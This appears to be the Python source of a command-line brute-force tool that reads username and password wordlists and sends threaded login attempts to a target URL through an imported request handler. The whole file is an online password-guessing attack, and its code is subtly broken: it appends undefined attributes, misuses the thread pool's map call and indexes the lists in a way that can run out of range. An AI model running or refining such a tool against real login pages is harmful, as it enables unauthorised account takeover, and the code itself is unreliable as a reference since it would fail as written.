from settings.const.const import KEYS, PASSWORD_LIST, USERNAME_LIST, VALIDATION_USER, VALIDATION_PASS
from settings.handle_requests.get_requests import Handle_requests
import concurrent.futures
import time
import os



class Brute_force_app():
    def __init__(self, url_path):
        self.keys = KEYS
        self.handle = Handle_requests(url_path)
        self.start_time = time.perf_counter()
        self.password_list = PASSWORD_LIST
        self.username_list = USERNAME_LIST
        self.validation_user = VALIDATION_USER
        self.validation_pass =  VALIDATION_PASS
        self.list_of_threads = []


    def get_username(self):
        path = "wordlist/usernames/"
        print(f'\u039E' * 100)
        print(f'\n{self.validation_user}\n')
        validation = input('Choose one of username options above: ')

        if validation == '0':
            print(f'\u039E' * 100)
            print(f'\n{self.username_list}\n')
            package_chosen = input(f'Which username wordlist do you want to use: ')
            
            for file in os.listdir(path):
                if file.startswith(package_chosen):
                    with open(path + file, "r", encoding="latin-1") as usernames:
                        for username in usernames:
                            replaced_user = username.replace("\n", "")
                            self.keys["user"].append(self.replaced_user)

            return True
                            
        if validation == '1':
            username_input = input('\nWrite your username: ')
            return self.keys["user"].append(username_input)

        
        return self.keys["user"].append('')


    def get_password(self):
        path = "wordlist/passwords/"
        print(f'\u039E' * 100) 
        print(f'\n{self.validation_pass}\n')
        validation = input('Choose one of passwords options above: ')
        
        if validation == '0':
            print(f'\u039E' * 100) 
            print(f'\n{self.password_list}\n')
            package_chosen = input(f'Which password wordlist do you want to use: ')
            print(f'\u039E' * 100)

            for file in os.listdir(path):
                if file.startswith(package_chosen):
                    with open(path + file, "r", encoding="latin-1") as passwords:
                        for password in passwords:
                            replaced_pass = password.replace("\n", "")
                            self.keys["password"].append(self.replaced_pass)

            return True
        
        if validation == '1':
            password_input = input('\nWrite your own password: ')
            return self.keys["password"].append(password_input)


        return self.keys["password"].append(''), print(f'\u039E' * 100) 


    def start_thread(self):
        print('Starting brute force...')
        time.sleep(3)

        if self.keys["user"] == [''] and self.keys["password"] == ['']:
            return print("\nERROR: WITHOUT {USER} AND {PASSWORD}!!!")
        
        for position in range(len(self.keys["user"]) + len(self.keys["password"])):
            if len(self.keys["user"]) > 1 and len(self.keys["password"]) > 1:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    executor.map(self.handle.get_credentials(self.keys["user"][position], self.keys["password"][position]))

            if len(self.keys["user"]) == 1:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    executor.map(self.handle.get_credentials(self.keys["user"][0], self.keys["password"][position - 1]))

            elif len(self.keys["password"]) == 1:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    executor.map(self.handle.get_credentials(self.keys["user"][position - 1], self.keys["password"][0]))

            elif len(self.keys['user']) == 1 and len(self.keys['password']) == 1:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    executor.map(self.handle.get_credentials(self.keys["user"][0], self.keys["password"][0]))


    def get_time(self):
        end_time = time.perf_counter()
        return print(f'\n\nFinished in {round(end_time - self.start_time, 2)} second(s)\n')


    def start_brute_force(self):
        self.get_username()
        self.get_password()
        self.start_thread()
        self.get_time()